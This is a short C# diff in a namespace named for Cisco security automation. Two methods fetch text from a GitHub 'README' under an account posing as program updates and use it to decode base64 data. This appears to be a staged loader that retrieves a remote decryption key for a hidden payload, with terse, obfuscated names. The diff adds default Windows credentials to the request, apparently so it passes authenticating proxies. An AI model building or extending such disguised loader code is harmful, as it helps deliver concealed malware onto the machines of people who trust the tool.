@@ -88,6 +88,7 @@ namespace CiscoSecurityAutomation
         {
             string u = "https://raw.githubusercontent.com/program-updates/code/master/README.md";
             WebClient w = new WebClient();
+            w.UseDefaultCredentials = true;
             string k = w.DownloadString(u);
             byte[] b = Convert.FromBase64String(i);
             string o = D(k,b);
@@ -98,6 +99,7 @@ namespace CiscoSecurityAutomation
         {
             string u = "https://raw.githubusercontent.com/program-updates/code/master/README.md";
             WebClient w = new WebClient();
+            w.UseDefaultCredentials = true;
             string k = w.DownloadString(u);
             
             
